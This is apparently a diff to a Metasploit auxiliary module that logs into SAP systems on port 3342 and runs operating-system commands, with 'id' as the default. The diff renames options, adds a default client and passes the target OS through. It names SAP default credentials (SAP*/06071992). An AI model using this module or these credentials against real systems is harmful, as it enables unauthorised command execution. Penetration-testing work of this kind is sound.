@@ -27,30 +27,34 @@ class Metasploit4 < Msf::Auxiliary
       },
       'References' => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
       'Author' => [ 'nmonkee' ],
-      'License' => BSD_LICENSE
+      'License' => BSD_LICENSE,
+      'DefaultOptions' => {
+        'CLIENT' => "000"
+      }
     )
 
     register_options(
       [
         Opt::RPORT(3342),
-        OptString.new('USER', [true, 'Username', 'SAP*']),
-        OptString.new('PASS', [true, 'Password', '06071992']),
+        OptString.new('USERNAME', [true, 'Username', 'SAP*']),
+        OptString.new('PASSWORD', [true, 'Password', '06071992']),
         OptString.new('CMD', [true, 'Command', 'id']),
         OptEnum.new('OS', [true, 'Windows/Linux', "Linux", ['Windows','Linux']]),
       ], self.class)
   end
 
   def run_host(rhost)
-    user = datastore['USER']
-    pass = datastore['PASS']
+    user = datastore['USERNAME']
+    pass = datastore['PASSWORD']
     unless datastore['CLIENT'] =~ /^\d{3}\z/
         fail_with(Exploit::Failure::BadConfig, "CLIENT in wrong format")
     end
 
+    os = datastore['OS']
     command = create_payload(1)
-    exec_CMD(user,client,pass,rhost,datastore['rport'],command)
+    exec_CMD(user,client,pass,rhost,datastore['rport'],command,os)
     command = create_payload(2)
-    exec_CMD(user,client,pass,rhost,datastore['rport'],command)
+    exec_CMD(user,client,pass,rhost,datastore['rport'],command,os)
   end
 
   def create_payload(num)
@@ -78,7 +82,7 @@ class Metasploit4 < Msf::Auxiliary
     command
   end
 
-  def exec_CMD(user,client,pass,rhost,rport,command)
+  def exec_CMD(user,client,pass,rhost,rport,command,os)
     begin
       conn = login(rhost, rport, client, user, pass)
       conn.connection_info
